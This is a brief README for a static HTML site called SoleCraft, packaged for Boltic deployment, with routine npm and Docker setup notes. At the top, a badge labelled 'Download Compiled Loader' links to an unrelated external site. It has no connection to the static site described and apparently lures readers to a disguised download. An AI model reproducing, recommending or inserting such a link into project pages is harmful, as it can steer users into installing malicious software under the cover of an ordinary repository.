# SoleCraft

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Static HTML SoleCraft website packaged for Boltic deployment.

Deployed via Boltic from this repository.

## Local Development

```bash
npm install
npm start
```

Open `http://localhost:8080` to view the website.

## Build And Run

```bash
npm run build
npm start
```

The build step is intentionally a no-op because the website is already contained in `index.html`.

## Boltic

This repo includes `Dockerfile` and `boltic.yaml` based on the deployment style from `sample-project`. Push the `solecraft` repo and connect it in Boltic.
